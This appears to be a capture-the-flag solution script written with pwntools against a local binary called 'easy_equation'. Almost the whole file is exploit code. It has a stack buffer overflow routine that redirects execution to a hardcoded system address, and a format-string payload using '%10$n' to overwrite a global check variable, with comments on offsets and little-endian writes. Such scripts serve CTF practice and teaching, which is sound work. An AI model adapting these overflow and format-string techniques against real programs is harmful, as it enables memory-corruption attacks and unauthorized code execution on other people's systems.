from pwn import *
context.arch = 'amd64'
# from z3 import *

# judge=Real('judge')
# solve(11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198)
#[judge = 2]

p = process('./easy_equation')
def overflow():
	sys_addr = 0x00000000004006D0
	p.send('A'*9+p64(sys_addr))
	p.interactive()


def strfmt():
	judge = 0x000000000060105C
	offset = 9
	# payload = "b%511c%10$hn"+"a"*5+p64(judge-1)
	# rewrite judge-1 to 0x200,store in little-endian,
	# so judge was change to 0x02
	payload = "aa%10$naa" + 'a'*8 + p64(judge)
	# rewrite a number which lower than 8(see in ctf-wiki)
	# notice,wether the way we use strfmt to write,
	# there is one thing need to be attention: 
	# we need make the judge locate at the 10th arguement of printf(debug could find the matter)
	p.sendline(payload)
	p.interactive()
strfmt()
# overflow()